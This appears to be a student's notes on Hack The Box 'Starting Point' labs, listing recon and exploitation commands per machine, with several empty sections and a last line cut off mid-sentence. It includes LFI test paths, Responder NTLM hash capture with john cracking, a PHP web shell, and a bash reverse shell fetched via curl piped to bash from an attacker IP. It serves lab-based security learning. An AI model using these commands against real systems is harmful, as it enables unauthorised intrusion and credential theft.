# Starting Point
## Commands
* *sudo nmap -sC -sV IPADDRESS*: Scans the IP address for open ports and gives information about the version and runs various scripts
* *gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u IPADDRESS/URL*: Used to enumrate directories and files.


  
## Appointment
* Structured query language (SQL) is a programming language for storing and processing information in a relational database.
* SQL Injection is a common way of exploiting web pages that use SQL Statements that retrieve and store user input data.
* *#* is used to comment a line in SQL.
* *'* is used to end the string in SQL.

## Sequel
* MariaDB (TCP 3306) is a community-developed, commercially supported fork of the MySQL.
* *mysql -h IPADDRESS -u USER* is the command used to connect to a database.
* SHOW databases; : Prints out the databases we can access.
* USE DBNAME; : Set to use the database named DBNAME.
* SHOW tables; : Prints out the available tables inside the current database.
* SELECT * FROM TABLE; : Prints out all the data from the table TABLE.

## Crocodile
* File Transfer Protocol (FTP) (TCP Port 21 & 22): it is a network protocol for transmitting files between computers over Transmission Control Protocol/Internet Protocol (TCP/IP)
* *anonymous* user can be used to log in to FTP when you don't have an account.
* *ftp IPADDRESS* is the command used to connect through ftp.
* *get FILENAME* is the command used to download a file in a ftp session.
* *anonymous* is the user used to login to an ftp session without a password.

## Responder
* Name-Based Virtual hosting is a method for hosting multiple domain names (with separate handling of each name) on a single server.
* The web server checks the domain name provided in the Host header field of the HTTP request and sends a response according to that.
* The */etc/hosts* file is used to resolve a hostname into an IP address & thus we will need to add an entry in the */etc/hosts* file for this domain to enable the browser to resolve the address for URL.
* LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application.
* RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote file on the host using protocols like HTTP, FTP etc.
* *../WINDOWS\System32\drivers\etc\hosts* is used usally to validate LFI vulnerability
* New Technology Lan Manager (NTLM)
  - is a collection of authentication protocols created by Microsoft. It is a challenge-response authentication protocol used to authenticate a client to a resource on an Active Directory domain.
  - It is a type of single sign-on (SSO) because it allows the user to provide the underlying authentication factor only once, at login.
  - The Process:
    1. The client sends the user name and domain name to the server.
    2. The server generates a random character string, referred to as the challenge.
    3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the server.
    4. The server retrieves the user password (or equivalent)
    5. The server uses the hash value retrieved from the security account database to encrypt the challenge string. The value is then compared to the value received from the client. If the values match, the client is authenticated.

* In the PHP configuration file php.ini , "allow_url_include" wrapper is set to "Off" by default, indicating that PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. 
* However, even if allow_url_include and allow_url_fopen are set to "Off", PHP will not prevent the loading of SMB URLs.
* Responder can do many different tasks in this case it will set up a malicious SMB server. When the target machine attempts to perform the NTLM authentication to that server, Responder sends a challenge back for the server to encrypt with the user's password.
* *sudo responder -I NETWORKINTERFACE* is used to start a responder session.
* *john -w=/usr/share/wordlists/rockyou.txt HASH.txt* is used to bruteforce the challenge in *HASH.txt*.
* *evil-winrm -i ADDRESS -u USER -p PASSWORD* is used to try and get a session on a windows machine.

## Three
* *Wappalyzer* is used to understand what technologies the website uses.
* *echo "IPADDRESS DOMAIN" | sudo tee -a /etc/hosts* is used to be able to access a virtual host.
* *gobuster vhost -w /usr/sharel/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u URL --append-domain*  is used to enumrate subdomains.
* S3 is a cloud-based object storage service. It allows us to store things in containers called buckets. AWS S3 buckets have various use-cases including Backup and Storage, Media Hosting, Software Delivery, Static Website etc.
* *awscli* is a utility that can be installed on linux and used to access AWS products.
* *aws configure* is used to configure AWS access key, secret access key, etc..
* *aws --endpoint=http:s3.URL s3 ls* is used to list all s3 buckets hosted by the server.
* *aws --endpoint=http://s3.URL s3 ls s3://URL* is used to list objects under specified bucket.
* *echo '<?php system($_GET["cmd"]); ?>' > shell.php* creates a mini php shell.
* *aws --endpoint=http://s3.URL s3 cp FILENAME s3://URL* uploads file to a s3 server.
* *URLshell.php?cmd=COMMAND* is used to use the previously uploaded shell.
* *#!/bin/bash
  bash -i >& /dev/tcp/IPADDRESS/PORTNUMBER 0>&1* Content for a bash reverse shell payload.
* *nc -nvlp PORTNUMBEr* Starts listening on that specified port.
* *python3 -m http.server 8000* Starts a python server (Used to upload the bash reverse shell)
* *URL/shell.php?cmd=curl%20IPADDRESS:8000/shell.sh|bash* used to upload the bash reverse shell.

## Ignition


## Bike


## Funnel


## Pennyworth


## Tactics
* *-Pn* is used as an option when using nmap on a target that block ICMP.
* *smbclient -L IPADDRESS -U USERNAME* To list the shares for IPADDRESS.
* *smbclient \\\\\\\IPADDRESS\\\\SHARENAME -U USERNAME* Is used to connect to a share.
* PsExec is a portable tool from Microsoft that lets you run processes remotely using any user's credentials.
* *python psexec.py USERNAME:PASSWORD@IPADDRESS* is used to get 
